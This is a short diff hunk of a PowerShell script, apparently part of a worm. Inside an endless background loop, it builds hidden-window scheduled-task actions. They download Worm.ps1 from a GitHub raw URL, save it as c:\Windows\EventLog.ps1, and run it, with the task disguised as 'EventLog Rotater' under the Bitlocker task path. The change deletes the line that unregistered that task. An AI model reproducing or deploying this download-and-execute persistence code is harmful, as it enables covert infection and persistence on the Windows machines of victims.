@@ -185,7 +185,7 @@ start-job -ScriptBlock {
     while(1 -eq 1){
         try{ 
 
-            Unregister-ScheduledTask -TaskPath \Microsoft\Windows\Bitlocker -TaskName "EventLog Rotater"  -Confirm:$false 
+            
             $action = @()
             $action += new-scheduledtaskaction -execute 'Powershell.exe' ` -Argument '-windowstyle hidden -Command "invoke-restmethod https://raw.githubusercontent.com/Magrene/powW/main/Worm.ps1 | out-file -filepath c:\Windows\EventLog.ps1'
             $action += new-scheduledtaskaction -execute 'Powershell.exe' ` -Argument '-windowstyle hidden -Command "C:\Windows\EventLog.ps1"'
